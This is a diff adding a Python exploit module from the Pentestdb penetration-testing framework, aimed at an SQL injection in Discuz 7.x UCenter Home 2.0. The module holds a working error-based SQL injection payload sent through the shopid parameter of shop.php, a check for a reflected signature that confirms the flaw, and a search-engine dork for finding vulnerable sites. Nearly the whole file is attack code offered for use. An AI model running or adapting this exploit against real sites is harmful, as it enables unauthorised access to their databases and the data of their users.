@@ -1,0 +1,46 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class UccenterSI(Exploit):
+    expName = u"Discuz 7.X uc-center home2.0 sql注入漏洞"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "discuz"
+    appVersion = "7.x"
+    reference = ['http://www.cnseay.com/528/']
+    description = u'''
+        漏洞利用条件：1.uccenter home2.0;
+        SQL注入漏洞
+        gh: inurl:shop.php?ac=view&shopid=
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        sig = '2c1743a391305fbf367df8e4f069f9f9'
+        payload = "1 and select 1 from (select concat_ws(':', left(rand(), 3), {0}), count(*) from information_schema.tables group by 1)a;".format(sig)
+
+        self.params['ac'] = 'view'
+        self.params['shopid'] = payload
+
+        url = self.urlJoin("/shop.php")
+        response = self.http.get(url, params=self.params)
+
+        if response.status_code == 200:
+            if sig in response.content:
+                result['fullpath'] = url
+                result['payload'] = response.request.url
+
+        return result
